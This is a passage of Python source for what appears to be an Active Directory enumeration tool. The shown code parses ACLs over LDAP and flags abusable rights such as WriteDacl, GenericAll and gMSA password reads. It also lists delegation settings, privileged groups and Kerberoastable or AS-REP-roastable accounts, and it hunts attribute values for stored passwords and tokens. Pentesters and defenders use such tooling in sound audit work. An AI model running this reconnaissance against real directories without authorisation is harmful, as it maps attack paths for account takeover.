    if not val or len(val.strip()) < 12:
        return True
    if len(matched.strip()) < 10:
        return True

    low = val.strip().lower()

                                                                                          
    benign_patterns = (
        r'^admin(?:istrator)?$',
        r'^contact\s+admin',
        r'^see\s+admin',
        r'^reset\s+by',
        r'^ticket\s*#?\d+$',
        r'^note:',
        r'^comment:',
        r'^info:',
    )
    for fp in benign_patterns:
        if re.search(fp, low, re.IGNORECASE):
            return True

                                                                               
    secret_markers = (
        'password', 'passwd', 'pwd', 'secret', 'token',
        'credential', 'api key', 'api-key', 'client secret',
        'bearer', 'basic ', 'connection string', 'connstring',
        'auth token', 'refresh token'
    )
    if not any(m in low for m in secret_markers):
        return True

    return False


                                                                                
              
                                                                                
def parse_aces(sd_bytes: bytes) -> list:
    aces = []
    try:
        if len(sd_bytes) < 20:
            return aces
        dacl_offset = struct.unpack_from("<I", sd_bytes, 16)[0]
        if not dacl_offset or dacl_offset >= len(sd_bytes):
            return aces
        if dacl_offset + 8 > len(sd_bytes):
            return aces
        ace_count = struct.unpack_from("<H", sd_bytes, dacl_offset + 4)[0]
        offset    = dacl_offset + 8
        for _ in range(ace_count):
            if offset + 4 > len(sd_bytes):
                break
            ace_type  = sd_bytes[offset]
            ace_flags = sd_bytes[offset + 1]
            ace_size  = struct.unpack_from("<H", sd_bytes, offset + 2)[0]
            if ace_size < 8 or offset + ace_size > len(sd_bytes):
                break
            ace_bytes   = sd_bytes[offset: offset + ace_size]
            access_mask = struct.unpack_from("<I", ace_bytes, 4)[0]
            object_type_guid    = None
            inherits_object_guid = None
            if ace_type in (0x05, 0x06):
                if len(ace_bytes) < 12:
                    offset += ace_size
                    continue
                flags = struct.unpack_from("<I", ace_bytes, 8)[0]
                pos   = 12
                if flags & 0x1 and len(ace_bytes) >= pos + 16:
                    object_type_guid = format_guid(ace_bytes[pos: pos + 16])
                    pos += 16
                if flags & 0x2 and len(ace_bytes) >= pos + 16:
                    inherits_object_guid = format_guid(ace_bytes[pos: pos + 16])
                    pos += 16
                sid_raw = ace_bytes[pos:]
            else:
                sid_raw = ace_bytes[8:]
            trustee   = sid_to_str(sid_raw)
            inherited = bool(ace_flags & 0x10)
            if trustee:
                aces.append({
                    "type":                ace_type,
                    "ace_flags":           ace_flags,
                    "inherited":           inherited,
                    "access_mask":         access_mask,
                    "trustee":             trustee,
                    "guid":                object_type_guid,
                    "inherit_object_guid": inherits_object_guid,
                })
            offset += ace_size
    except Exception:
        pass
    return aces


                                                                                
                                                   
                                                                                
def check_rights(access_mask: int, guid: str | None,
                 include_all: bool = False, read_guids: dict | None = None) -> list:
    
    found = []

                                                                             
                                                                               
    if ((access_mask & 0x000F01FF) == 0x000F01FF) or (access_mask & 0x10000000):
        return ["GenericAll"]

                                                                            
    if access_mask & 0x00040000:
        found.append("WriteDacl")
    if access_mask & 0x00080000:
        found.append("WriteOwner")

                                                                            
                                                                               
                                                                           
    if access_mask & 0x40000000:
        found.append("GenericWrite")

                                                                           
                                          
                                                                                    
                                                                     
                                                         
    elif (access_mask & 0x00000020) and not guid:
        if "GenericWrite" not in found:
            found.append("WriteAllProperties")

                                                                           
                                                                                  
                                                                                
    if access_mask & 0x00000100:
        if guid:
            g    = guid.lower()
            name = EXTENDED_RIGHT_GUIDS.get(g)
            if not name and read_guids:
                name = read_guids.get(g)
            if name:
                if name not in found:
                    found.append(name)
            elif include_all:
                found.append(f"ExtendedRight({guid})")
        else:
            found.append("AllExtendedRights")

                                                                          
    if (access_mask & 0x00000020) and guid:
        g    = guid.lower()
        name = PROPERTY_WRITE_GUIDS.get(g)
        if name and name not in found:
            found.append(name)
        elif not name:
                                                                                   
                                                                                    
            if include_all:
                found.append(f"WriteProperty({guid})")
            else:
                                                                            
                found.append("WriteProperty")

                                                                                    
                                                                                  
                                                                                
    if (access_mask & 0x00000010) and guid and read_guids:
        g    = guid.lower()
        name = read_guids.get(g)
        if name and name not in found:
            found.append(name)

                                                                            
    if include_all and (access_mask & 0x00000008) and "GenericWrite" not in found:
        found.append("Self")

    return found


def decode_rights_verbose(access_mask: int, guid: str | None) -> str:
    if ((access_mask & 0x000F01FF) == 0x000F01FF) or (access_mask & 0x10000000):
        return "GenericAll"
    parts = []
    if access_mask & 0x00040000: parts.append("WriteDacl")
    if access_mask & 0x00080000: parts.append("WriteOwner")
    if access_mask & 0x00020000: parts.append("ReadControl")
    if access_mask & 0x00010000: parts.append("Delete")
    if access_mask & 0x40000000: parts.append("GenericWrite")
    elif access_mask & 0x00000020:
        if not guid:
            parts.append("WriteAllProperties[no-GUID]")
        else:
            label = PROPERTY_WRITE_GUIDS.get(guid.lower(), f"WriteProperty({guid})")
            parts.append(label)
    if access_mask & 0x00000008: parts.append("Self")
    if access_mask & 0x00000100:
        if guid:
            label = EXTENDED_RIGHT_GUIDS.get(guid.lower(), f"ExtRight({guid})")
            parts.append(label)
        else:
            parts.append("AllExtendedRights")
    if access_mask & 0x00000010: parts.append("ReadProperty")
    if access_mask & 0x00000004: parts.append("ListChildren")
    if access_mask & 0x00000001: parts.append("CreateChild")
    if access_mask & 0x00000002: parts.append("DeleteChild")
    return ", ".join(parts) if parts else f"0x{access_mask:08X}"


                                                                                
                                   
                                                                                
def hunt_acls(conn, domain_dn: str, target_sid: str,
              include_all: bool = False,
              skip_inherited: bool = False,
              page_size: int = 500) -> list:
    print(f"\n{Fore.CYAN}[*] Paged ACL scan (page_size={page_size})...{Style.RESET_ALL}")
    sd_ctrl = security_descriptor_control(sdflags=0x04)

                                                                             
                                                                              
                                                                             
    print(f"{Fore.CYAN}[*] Resolving LAPS attribute schemaIDGUIDs (forest-specific)...{Style.RESET_ALL}")
    laps_read_guids = build_laps_read_guids(conn)
    if laps_read_guids:
        print(f"{Fore.GREEN}[+] LAPS secret attribute GUID(s) resolved: "
              f"{len(set(laps_read_guids.keys()))}{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}[!] No LAPS attributes found in schema "
              f"(legacy/Windows LAPS not deployed in this forest){Style.RESET_ALL}")

    all_entries = paged_search_all(
        conn, domain_dn,
        search_filter="(objectClass=*)",
        attributes=["nTSecurityDescriptor", "distinguishedName",
                    "objectClass", "name", "sAMAccountName",
                    "msDS-GroupMSAMembership"],
        page_size=page_size,
        extra_controls=sd_ctrl,
    )
    total   = len(all_entries)
    results = []
    print(f"{Fore.CYAN}[*] Scanning {total} objects for SID {target_sid}...{Style.RESET_ALL}")
    for i, entry in enumerate(all_entries):
        try:
            raw_sd_list = entry.get("raw_attributes", {}).get("nTSecurityDescriptor", [])
            obj_dn      = entry.get("dn", "")
            obj_name, obj_class = entry_summary(entry)

                                                                             
                                                                
                                                                             
            if raw_sd_list:
                raw_sd = raw_sd_list[0]
                aces   = parse_aces(raw_sd)
                for ace in aces:
                    if ace["trustee"] != target_sid:
                        continue
                    if skip_inherited and ace["inherited"]:
                        continue
                    ace_type  = ace.get("type")
                    rights_vb = decode_rights_verbose(ace["access_mask"], ace["guid"])
                    if include_all:
                        rights = check_rights(ace["access_mask"], ace["guid"],
                                              include_all=True, read_guids=laps_read_guids)
                        if not rights:
                            rights = [f"0x{ace['access_mask']:08X}"]
                    else:
                        if ace_type not in (0x00, 0x05):
                            continue
                        rights = check_rights(ace["access_mask"], ace["guid"],
                                              read_guids=laps_read_guids)
                        if not rights:
                            continue
                    for right in rights:
                        technique = ATTACK_TECHNIQUES.get(right, {})
                        severity  = SEVERITY.get(right, "LOW")
                        results.append({
                            "right":          right,
                            "severity":       severity,
                            "technique":      technique.get("technique", right),
                            "methods":        technique.get("methods", []),
                            "attack_vector":  technique.get("attack_vector", ""),
                            "ace_type":       ace_type,
                            "ace_type_name":  ACE_TYPE_NAMES.get(ace_type, f"0x{ace_type:02x}"),
                            "object_name":    obj_name,
                            "object_dn":      obj_dn,
                            "object_class":   obj_class,
                            "access_mask":    ace["access_mask"],
                            "guid":           ace["guid"],
                            "inherited":      ace["inherited"],
                            "verbose_rights": rights_vb,
                            "trustee":        ace["trustee"],
                        })

                                                                             
                                                                  
                                                                             
                                                                                
                                                                               
                                                                          
            if "msds-groupmanagedserviceaccount" in obj_class:
                gmsa_sd_list = entry.get("raw_attributes", {}).get("msDS-GroupMSAMembership", [])
                if gmsa_sd_list:
                    gmsa_aces = parse_aces(gmsa_sd_list[0])
                    for g_ace in gmsa_aces:
                        if g_ace["trustee"] != target_sid:
                            continue
                        if g_ace.get("type") not in (0x00, 0x05):
                            continue
                        right     = "ReadGMSAPassword"
                        technique = ATTACK_TECHNIQUES.get(right, {})
                        severity  = SEVERITY.get(right, "HIGH")
                        results.append({
                            "right":          right,
                            "severity":       severity,
                            "technique":      technique.get("technique", right),
                            "methods":        technique.get("methods", []),
                            "attack_vector":  technique.get("attack_vector", ""),
                            "ace_type":       g_ace.get("type"),
                            "ace_type_name":  ACE_TYPE_NAMES.get(g_ace.get("type"),
                                                                  f"0x{g_ace.get('type'):02x}"),
                            "object_name":    obj_name,
                            "object_dn":      obj_dn,
                            "object_class":   obj_class,
                            "access_mask":    g_ace["access_mask"],
                            "guid":           g_ace.get("guid"),
                            "inherited":      False,
                            "verbose_rights": "ReadGMSAPassword (PrincipalsAllowedToRetrieveManagedPassword)",
                            "trustee":        g_ace["trustee"],
                        })
        except Exception:
            continue
        if i % 100 == 0 or i == total - 1:
            pct = int(((i + 1) / max(total, 1)) * 100)
            bar = "█" * (pct // 5) + "░" * (20 - pct // 5)
            print(f"\r  [{bar}] {pct}%  ({i+1}/{total})", end="", flush=True)
    print(f"\r  [{'█'*20}] 100%  ({total}/{total})  ")
    return results


                                                                                
                      
                                                                                
def check_admin_sdholder(conn, domain_dn: str, target_sid: str | None = None) -> dict:
    sdh_dn  = f"CN=AdminSDHolder,CN=System,{domain_dn}"
    results = {"dn": sdh_dn, "findings": [], "protected_accounts": [], "owner": ""}
    print(f"\n{Fore.CYAN}[*] Querying AdminSDHolder: {sdh_dn}{Style.RESET_ALL}")
    sd_ctrl = security_descriptor_control(sdflags=0x04)
    try:
        conn.search(
            search_base=sdh_dn,
            search_filter="(objectClass=*)",
            search_scope=BASE,
            attributes=["nTSecurityDescriptor", "distinguishedName"],
            controls=sd_ctrl,
        )
    except Exception as e:
        results["error"] = str(e)
        return results
    if not conn.entries:
        results["error"] = "AdminSDHolder object not found"
        return results
    raw_sd_list = conn.entries[0]["nTSecurityDescriptor"].raw_values
    if not raw_sd_list:
        results["error"] = "No security descriptor found"
        return results
    raw_sd          = raw_sd_list[0]
    results["owner"] = parse_sd_owner(raw_sd)
    aces    = parse_aces(raw_sd)
    builtin = {"S-1-5-18", "S-1-5-9", "S-1-5-10",
               "S-1-5-32-544", "S-1-5-32-548", "S-1-5-32-549",
               "S-1-5-32-550", "S-1-5-32-551", "S-1-5-32-552"}
    for ace in aces:
        trustee = ace["trustee"]
        if target_sid and trustee != target_sid:
            continue
        if not target_sid and trustee in builtin:
            continue
        if ace["type"] not in (0x00, 0x05):
            continue
        rights = check_rights(ace["access_mask"], ace["guid"], include_all=False)
        if not rights:
            continue
        for right in rights:
            severity  = SEVERITY.get(right, "LOW")
            technique = ATTACK_TECHNIQUES.get(right, {})
            results["findings"].append({
                "trustee":      trustee,
                "right":        right,
                "severity":     severity,
                "technique":    technique.get("technique", right),
                "methods":      technique.get("methods", []),
                "attack_vector": technique.get("attack_vector", ""),
                "inherited":    ace["inherited"],
                "guid":         ace["guid"],
                "verbose":      decode_rights_verbose(ace["access_mask"], ace["guid"]),
                "impact":       "This ACE propagates via SDProp to ALL adminCount=1 accounts every 60 min.",
            })
    print(f"{Fore.CYAN}[*] Enumerating adminCount=1 accounts...{Style.RESET_ALL}")
    protected = paged_search_all(
        conn, domain_dn,
        search_filter="(adminCount=1)",
        attributes=["sAMAccountName", "objectClass", "userAccountControl", "memberOf"],
        page_size=200,
    )
    for p in protected:
        attrs    = p.get("attributes", {})
        sam      = first_value(attrs.get("sAMAccountName")) or "?"
        classes  = listify(attrs.get("objectClass"))
        uac      = int(first_value(attrs.get("userAccountControl")) or 0)
        disabled = bool(uac & UAC_DISABLED)
        results["protected_accounts"].append({
            "sam":      str(sam),
            "type":     "Group" if "group" in classes else "User",
            "disabled": disabled,
        })
    return results


                                                                                
                           
                                                                                
def get_group_members(conn, domain_dn: str, group_name: str,
                      _visited: set | None = None) -> list:
    if _visited is None:
        _visited = set()
    if group_name.lower() in _visited:
        return []
    _visited.add(group_name.lower())
    conn.search(
        search_base=domain_dn,
        search_filter=f"(sAMAccountName={group_name})",
        search_scope=SUBTREE,
        attributes=["member", "distinguishedName"],
    )
    if not conn.entries:
        return []
    member_dns = [str(m) for m in (conn.entries[0]["member"].values or [])]
    result = []
    for mdn in member_dns:
        try:
            conn.search(
                search_base=mdn, search_filter="(objectClass=*)", search_scope=BASE,
                attributes=["sAMAccountName", "name", "objectClass",
                            "userAccountControl", "dNSHostName"],
            )
            if not conn.entries:
                continue
            e       = conn.entries[0]
            sam     = (str(e["sAMAccountName"].value)
                       if e["sAMAccountName"].value else str(e["name"].value))
            classes = [c.lower() for c in e["objectClass"].values]
            uac     = int(e["userAccountControl"].value or 0) if e["userAccountControl"].value else 0
            is_group = "group" in classes
            nested = []
            if is_group:
                nested = get_group_members(conn, domain_dn, sam, _visited)
            result.append({
                "sam":      sam,
                "dn":       mdn,
                "type":     "Group"    if is_group else
                            "Computer" if "computer" in classes else "User",
                "disabled": bool(uac & UAC_DISABLED),
                "nested":   nested,
            })
        except Exception:
            continue
    return result


def get_member_of(conn, domain_dn: str, username: str) -> list:
    conn.search(
        search_base=domain_dn,
        search_filter=f"(sAMAccountName={username})",
        search_scope=SUBTREE,
        attributes=["memberOf", "distinguishedName"],
    )
    if not conn.entries:
        return []
    groups = []
    for g in listify(conn.entries[0]["memberOf"].values):
        gdn = str(g)
        cn  = gdn.split(",")[0].replace("CN=","").replace("cn=","")
        groups.append({"dn": gdn, "name": cn})
    return groups


def check_is_nested(conn, domain_dn: str, group_name: str) -> list:
    conn.search(
        search_base=domain_dn,
        search_filter=f"(sAMAccountName={group_name})",
        search_scope=SUBTREE,
        attributes=["memberOf", "distinguishedName"],
    )
    if not conn.entries:
        return []
    parents = []
    for g in listify(conn.entries[0]["memberOf"].values):
        gdn = str(g)
        cn  = gdn.split(",")[0].replace("CN=","").replace("cn=","")
        parents.append({"dn": gdn, "name": cn})
    return parents


                                                                                
                                
                                                                                
MSSQL_SPN_PREFIXES = ("MSSQLSvc/", "MSSQL/", "MSSQLSvc")
WINRM_GROUPS  = ["Remote Management Users", "WinRMRemoteWMIUsers__"]
RDP_GROUPS    = ["Remote Desktop Users"]


def _enum_privilege_group(conn, domain_dn: str, group_name: str,
                           access_type: str) -> tuple[list, list]:
    members, computers = [], []
    conn.search(
        search_base=domain_dn,
        search_filter=f"(sAMAccountName={group_name})",
        search_scope=SUBTREE,
        attributes=["member", "distinguishedName"],
    )
    if not conn.entries:
        return members, computers
    member_dns = [str(m) for m in (conn.entries[0]["member"].values or [])]
    for mdn in member_dns:
        try:
            conn.search(
                search_base=mdn, search_filter="(objectClass=*)", search_scope=BASE,
                attributes=["sAMAccountName", "name", "objectClass",
                            "userAccountControl", "dNSHostName"],
            )
            if not conn.entries:
                continue
            e       = conn.entries[0]
            sam     = (str(e["sAMAccountName"].value)
                       if e["sAMAccountName"].value else str(e["name"].value))
            classes = [c.lower() for c in e["objectClass"].values]
            uac     = int(e["userAccountControl"].value or 0) if e["userAccountControl"].value else 0
            dns     = str(e["dNSHostName"].value) if e["dNSHostName"].value else ""
            is_comp = "computer" in classes
            is_grp  = "group"    in classes
            if is_comp:
                computers.append({"sam": sam, "dns": dns, "type": access_type})
            else:
                members.append({
                    "sam":      sam,
                    "type":     "Group" if is_grp else "User",
                    "disabled": bool(uac & UAC_DISABLED),
                    "access":   access_type,
                })
        except Exception:
            continue
    return members, computers


def _find_domain_users_in_group(conn, domain_dn: str, domain_sid_prefix: str,
                                 group_name: str, edge_name: str) -> list:
    results = []
    if not domain_sid_prefix:
        return results
    domain_users_sid = f"{domain_sid_prefix}-513"
    conn.search(
        search_base=domain_dn,
        search_filter=f"(sAMAccountName={group_name})",
        search_scope=SUBTREE,
        attributes=["member", "distinguishedName", "name"],
    )
    if not conn.entries:
        return results
    for entry in conn.entries:
        member_dns = [str(m) for m in (entry["member"].values or [])]
        for mdn in member_dns:
            try:
                conn.search(
                    search_base=mdn, search_filter="(objectClass=*)", search_scope=BASE,
                    attributes=["objectSid", "sAMAccountName"],
                )
                if conn.entries:
                    raw_sid = conn.entries[0]["objectSid"].raw_values[0]
                    if sid_to_str(raw_sid) == domain_users_sid:
                        results.append({
                            "group":   str(entry["name"].value),
                            "edge":    edge_name,
                            "warning": "Domain Users is a member — ALL domain accounts have this access!",
                        })
            except Exception:
                continue
    return results


def enum_privileged_access(conn, domain_dn: str) -> dict:
    result = {
        "sql_instances":            [],
        "sql_service_accounts":     [],
        "rdp_group_members":        [],
        "rdp_computers":            [],
        "winrm_group_members":      [],
        "winrm_computers":          [],
        "unconstrained_delegation": [],
        "constrained_delegation":   [],
        "domain_users_rdp_hosts":   [],
        "domain_users_winrm_hosts": [],
    }
    domain_sid_prefix = _get_domain_sid_prefix(conn, domain_dn)

    print(f"  {Fore.CYAN}[*] Enumerating MSSQL SPN accounts...{Style.RESET_ALL}")
    sql_entries = paged_search_all(
        conn, domain_dn,
        search_filter="(servicePrincipalName=MSSQLSvc/*)",
        attributes=["sAMAccountName", "servicePrincipalName", "objectClass",
                    "userAccountControl", "pwdLastSet", "lastLogonTimestamp"],
        page_size=200,
    )
    for e in sql_entries:
        attrs   = e.get("attributes", {})
        sam     = str(first_value(attrs.get("sAMAccountName")) or "?")
        spns    = listify(attrs.get("servicePrincipalName"))
        classes = listify(attrs.get("objectClass"))
        uac     = int(first_value(attrs.get("userAccountControl")) or 0)
        mssql_spns  = [s for s in spns if any(s.startswith(p) for p in MSSQL_SPN_PREFIXES)]
        is_computer = "computer" in [c.lower() for c in classes]
        is_user     = "user"     in [c.lower() for c in classes]
        for spn in mssql_spns:
            parts     = spn.split("/", 1)
            host_port = parts[1] if len(parts) > 1 else spn
            host_part = host_port.split(":")[0]
            port      = host_port.split(":")[1] if ":" in host_port else "1433"
            result["sql_instances"].append({
                "instance":       spn,
                "host":           host_part,
                "port":           port,
                "account":        sam,
                "account_type":   "Computer" if is_computer else "ServiceAccount",
                "kerberoastable": is_user and not bool(uac & UAC_DISABLED),
            })
            if is_user:
                result["sql_service_accounts"].append({
                    "sam":            sam,
                    "spn":            spn,
                    "kerberoastable": True,
                    "disabled":       bool(uac & UAC_DISABLED),
                })

    print(f"  {Fore.CYAN}[*] Enumerating Remote Desktop Users group...{Style.RESET_ALL}")
    for grp in RDP_GROUPS:
        members, computers = _enum_privilege_group(conn, domain_dn, grp, "RDP")
        result["rdp_group_members"].extend(members)
        result["rdp_computers"].extend(computers)
    result["domain_users_rdp_hosts"] = _find_domain_users_in_group(
        conn, domain_dn, domain_sid_prefix, "Remote Desktop Users", "CanRDP"
    )

    print(f"  {Fore.CYAN}[*] Enumerating Remote Management Users group...{Style.RESET_ALL}")
    for grp in WINRM_GROUPS:
        members, computers = _enum_privilege_group(conn, domain_dn, grp, "WinRM")
        result["winrm_group_members"].extend(members)
        result["winrm_computers"].extend(computers)
    result["domain_users_winrm_hosts"] = _find_domain_users_in_group(
        conn, domain_dn, domain_sid_prefix, "Remote Management Users", "CanPSRemote"
    )

    print(f"  {Fore.CYAN}[*] Enumerating Unconstrained Delegation...{Style.RESET_ALL}")
    unc_entries = paged_search_all(
        conn, domain_dn,
        search_filter="(&(userAccountControl:1.2.840.113556.1.4.803:=524288)"
                      "(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))",
        attributes=["sAMAccountName", "objectClass", "userAccountControl",
                    "operatingSystem", "dNSHostName"],
        page_size=200,
    )
    for e in unc_entries:
        attrs   = e.get("attributes", {})
        sam     = str(first_value(attrs.get("sAMAccountName")) or "?")
        classes = listify(attrs.get("objectClass"))
        dns     = str(first_value(attrs.get("dNSHostName")) or "")
        os_     = str(first_value(attrs.get("operatingSystem")) or "")
        is_comp = "computer" in [c.lower() for c in classes]
        result["unconstrained_delegation"].append({
            "sam":      sam,
            "dns":      dns,
            "os":       os_,
            "type":     "Computer" if is_comp else "User",
            "severity": "CRITICAL",
            "impact":   "Any privileged machine coerced to authenticate here "
                        "will cache its TGT — capturing it allows impersonation.",
        })

    print(f"  {Fore.CYAN}[*] Enumerating Constrained Delegation...{Style.RESET_ALL}")
    cd_entries = paged_search_all(
        conn, domain_dn,
        search_filter="(msDS-AllowedToDelegateTo=*)",
        attributes=["sAMAccountName", "objectClass", "msDS-AllowedToDelegateTo",
                    "userAccountControl", "dNSHostName"],
        page_size=200,
    )
    for e in cd_entries:
        attrs       = e.get("attributes", {})
        sam         = str(first_value(attrs.get("sAMAccountName")) or "?")
        classes     = listify(attrs.get("objectClass"))
        targets     = listify(attrs.get("msDS-AllowedToDelegateTo"))
        uac         = int(first_value(attrs.get("userAccountControl")) or 0)
        is_comp     = "computer" in [c.lower() for c in classes]
        proto_trans = bool(uac & UAC_TRUSTED_TO_AUTH_FOR_DELEGATION)
        result["constrained_delegation"].append({
            "sam":                 sam,
            "type":                "Computer" if is_comp else "User",
            "allowed_targets":     [str(t) for t in targets[:10]],
            "protocol_transition": proto_trans,
            "severity":            "HIGH" if proto_trans else "MEDIUM",
            "impact": (
                "S4U2Self + S4U2Proxy to allowed services. "
                + ("Protocol Transition enabled: can impersonate any user without their credentials. "
                   if proto_trans else "")
                + f"Target service(s): {', '.join(str(t) for t in targets[:3])}"
            ),
        })

    return result


                                                                                
               
                                                                                
def run_domain_recon(conn, domain_dn: str) -> dict:
    def _interval_to_days(raw_val):
        try:
            if raw_val is None:
                return None
            n = int(raw_val)
            if n == 0:
                return 0
            return round(abs(n) / 10_000_000 / 86400, 2)
        except Exception:
            return None

    def _interval_to_minutes(raw_val):
        days = _interval_to_days(raw_val)
        if days is None:
            return None
        return round(days * 24 * 60, 2)

    recon = {
        "domain_info":           {},
        "password_policy":       {},
        "machine_account_quota": {"quota": -1, "finding": ""},
        "kerberoastable":        [],
        "asrep_roastable":       [],
        "pwd_never_expires":     [],
        "pwd_not_required":      [],
        "admin_count":           [],
        "laps_computers":        [],
        "no_laps_computers":     [],
        "computers_by_os":       {},
        "privileged_groups":     {},
        "interesting_accounts":  [],
    }

    privileged_group_names = (
        "Domain Admins", "Enterprise Admins", "Schema Admins",
        "Administrators", "Account Operators", "Backup Operators",
        "Server Operators", "Print Operators",
        "Group Policy Creator Owners", "DnsAdmins", "Protected Users",
        "Pre-Windows 2000 Compatible Access",
    )

    print(f"  {Fore.CYAN}[*] Gathering domain info and policy...{Style.RESET_ALL}")
    conn.search(
        search_base=domain_dn,
        search_filter="(objectClass=domain)",
        search_scope=BASE,
        attributes=[
            "name", "objectSid", "whenCreated", "msDS-Behavior-Version",
            "minPwdLength", "minPwdAge", "maxPwdAge", "pwdHistoryLength",
            "pwdProperties", "lockoutThreshold", "lockoutDuration",
            "lockOutObservationWindow", "ms-DS-MachineAccountQuota",
        ],
    )
    if conn.entries:
        e = conn.entries[0]
        fl_raw = first_value(e["msDS-Behavior-Version"].values) if e["msDS-Behavior-Version"].values else 0
        fl_map = {
            0: "2000", 1: "2003 Mixed", 2: "2003", 3: "2008",
            4: "2008 R2", 5: "2012", 6: "2012 R2", 7: "2016", 10: "2019/2022"
        }

        recon["domain_info"] = {
            "name":             str(e["name"].value or ""),
            "sid":              sid_to_str(e["objectSid"].raw_values[0]) if e["objectSid"].raw_values else "",
            "when_created":     str(e["whenCreated"].value or ""),
            "functional_level": fl_map.get(int(fl_raw or 0), str(fl_raw)),
        }

        min_pwd_age_days = _interval_to_days(first_value(e["minPwdAge"].values) if e["minPwdAge"].values else 0)
        max_pwd_age_days = _interval_to_days(first_value(e["maxPwdAge"].values) if e["maxPwdAge"].values else 0)
        lockout_duration_min = _interval_to_minutes(first_value(e["lockoutDuration"].values) if e["lockoutDuration"].values else 0)
        lockout_window_min = _interval_to_minutes(first_value(e["lockOutObservationWindow"].values) if e["lockOutObservationWindow"].values else 0)

        recon["password_policy"] = {
            "min_length":            int(first_value(e["minPwdLength"].values) or 0),
            "min_age_days":          min_pwd_age_days,
            "max_age_days":          max_pwd_age_days,
            "history_length":        int(first_value(e["pwdHistoryLength"].values) or 0),
            "lockout_threshold":     int(first_value(e["lockoutThreshold"].values) or 0),
            "lockout_duration_min":  lockout_duration_min,
            "lockout_window_min":    lockout_window_min,
            "complexity":            bool(int(first_value(e["pwdProperties"].values) or 0) & 1),
        }

        quota_val = first_value(e["ms-DS-MachineAccountQuota"].values) if e["ms-DS-MachineAccountQuota"].values else 0
        try:
            quota = int(quota_val or 0)
        except Exception:
            quota = 0
        recon["machine_account_quota"] = {
            "quota": quota,
            "finding": (
                f"ms-DS-MachineAccountQuota = {quota}. "
                "Any authenticated domain user can add machine accounts."
                if quota > 0 else
                "ms-DS-MachineAccountQuota = 0. Domain users cannot add machine accounts."
            ),
        }

    print(f"  {Fore.CYAN}[*] Enumerating privileged groups...{Style.RESET_ALL}")
    for grp_name in privileged_group_names:
        group_data = {
            "member_count": 0,
            "members": [],
            "disabled_members": 0,
            "warning": "",
        }
        try:
            conn.search(
                search_base=domain_dn,
                search_filter=f"(sAMAccountName={grp_name})",
                search_scope=SUBTREE,
                attributes=["member"],
            )
            if not conn.entries:
                recon["privileged_groups"][grp_name] = group_data
                continue

            members = []
            for mdn in listify(conn.entries[0]["member"].values):
                mdn_str = str(mdn)
                try:
                    conn.search(
                        search_base=mdn_str,
                        search_filter="(objectClass=*)",
                        search_scope=BASE,
                        attributes=["sAMAccountName", "name", "objectClass", "userAccountControl"],
                    )
                    if not conn.entries:
                        continue
                    me = conn.entries[0]
                    sam = str(me["sAMAccountName"].value or me["name"].value or mdn_str.split(",")[0].replace("CN=", ""))
                    uac = int(me["userAccountControl"].value or 0) if me["userAccountControl"].value else 0
                    members.append(sam)
                    if uac & UAC_DISABLED:
                        group_data["disabled_members"] += 1
                except Exception:
                    members.append(mdn_str.split(",")[0].replace("CN=", ""))
            group_data["member_count"] = len(members)
            group_data["members"] = members[:25]
            group_data["warning"] = "Contains disabled members" if group_data["disabled_members"] else ""
            recon["privileged_groups"][grp_name] = group_data
        except Exception:
            recon["privileged_groups"][grp_name] = group_data

    print(f"  {Fore.CYAN}[*] Finding Kerberoastable, ASREP, and weak-account signals...{Style.RESET_ALL}")
    user_entries = paged_search_all(
        conn,
        domain_dn,
        search_filter="(&(objectClass=user)(!(objectClass=computer)))",
        attributes=[
            "sAMAccountName", "servicePrincipalName", "userAccountControl",
            "adminCount", "memberOf", "whenChanged", "distinguishedName",
            "objectClass",
        ],
        page_size=250,
    )

    def _group_names(member_of_values):
        return [str(g).split(",")[0].replace("CN=", "") for g in listify(member_of_values)]

    privileged_group_set = {g.lower() for g in privileged_group_names}

    for e in user_entries:
        attrs = e.get("attributes", {})
        sam = str(first_value(attrs.get("sAMAccountName")) or "?")
        dn = e.get("dn", "")
        uac = int(first_value(attrs.get("userAccountControl")) or 0)
        adm = int(first_value(attrs.get("adminCount")) or 0)
        spns = [str(s) for s in listify(attrs.get("servicePrincipalName")) if str(s).strip()]
        groups = _group_names(attrs.get("memberOf"))
        groups_l = [g.lower() for g in groups]
        is_enabled = not bool(uac & UAC_DISABLED)
        is_privileged = adm == 1 or any(g in privileged_group_set or "admin" in g for g in groups_l)

        base_record = {
            "sam": sam,
            "dn": dn,
            "member_of": groups[:5],
            "admin_count": adm,
            "disabled": not is_enabled,
            "is_privileged": is_privileged,
        }

        if spns and is_enabled:
            recon["kerberoastable"].append({
                **base_record,
                "spns": spns[:5],
                "finding": f"'{sam}' has SPNs and is enabled; Kerberoast candidate.",
            })

        if (uac & UAC_DONT_REQ_PREAUTH) and is_enabled:
            recon["asrep_roastable"].append({
                **base_record,
                "finding": f"'{sam}' has DONT_REQ_PREAUTH; ASREPRoast candidate.",
            })

        if (uac & UAC_DONT_EXPIRE_PASSWORD) and is_enabled:
            recon["pwd_never_expires"].append({
                **base_record,
                "finding": f"'{sam}' has PasswordNeverExpires set.",
            })

        if (uac & UAC_PASSWD_NOTREQD) and is_enabled:
            recon["pwd_not_required"].append({
                **base_record,
                "finding": f"'{sam}' has PASSWD_NOTREQD set.",
            })

        if adm == 1:
            recon["admin_count"].append({
                **base_record,
                "finding": f"'{sam}' has adminCount=1 and is protected by AdminSDHolder.",
            })

        if (
            spns or
            (uac & UAC_DONT_REQ_PREAUTH) or
            (uac & UAC_DONT_EXPIRE_PASSWORD) or
            (uac & UAC_PASSWD_NOTREQD) or
            (uac & UAC_ENCRYPTED_TEXT_PWD_ALLOWED) or
            (uac & UAC_TRUSTED_FOR_DELEGATION) or
            (uac & UAC_TRUSTED_TO_AUTH_FOR_DELEGATION) or
            adm == 1
        ):
            flags = []
            if spns:
                flags.append("SPN")
            if uac & UAC_DONT_REQ_PREAUTH:
                flags.append("DONT_REQ_PREAUTH")
            if uac & UAC_DONT_EXPIRE_PASSWORD:
                flags.append("PWD_NEVER_EXPIRES")
            if uac & UAC_PASSWD_NOTREQD:
                flags.append("PASSWD_NOTREQD")
            if uac & UAC_ENCRYPTED_TEXT_PWD_ALLOWED:
                flags.append("REVERSIBLE_ENCRYPTION")
            if uac & UAC_TRUSTED_FOR_DELEGATION:
                flags.append("UNCONSTRAINED_DELEGATION")
            if uac & UAC_TRUSTED_TO_AUTH_FOR_DELEGATION:
                flags.append("PROTOCOL_TRANSITION")
            if adm == 1:
                flags.append("ADMINCOUNT1")
            recon["interesting_accounts"].append({
                **base_record,
                "flags": flags,
            })

